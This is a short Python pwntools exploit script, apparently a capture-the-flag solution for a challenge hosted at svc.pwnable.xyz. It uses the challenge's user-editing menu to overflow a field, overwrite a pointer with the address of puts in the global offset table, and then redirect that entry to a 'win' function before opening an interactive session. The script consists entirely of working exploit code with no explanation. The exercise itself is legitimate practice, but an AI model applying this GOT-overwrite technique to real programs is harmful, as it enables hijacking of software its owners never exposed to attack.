from pwn import *

#p = process('./challenge')
p = remote("svc.pwnable.xyz", 30011)
e = ELF('./challenge')

def create_user(Name, age):
    p.sendlineafter(b"> ", b"1")
    p.sendafter(b"Name: ", Name)
    p.sendafter(b"Age: ", age)

def edit_usr(Name, age):
    p.sendlineafter(b"> ", b"3")
    p.sendafter(b"Name: ", Name)
    p.sendafter(b"Age: ", age)

puts_got = e.got['puts']
win = e.symbols['win']
create_user(b"A" * 0x20, b"1")
edit_usr(b"A" * 0x20, b"A" * 0x10 + p64(puts_got))
edit_usr(p64(win), b"1")
p.interactive()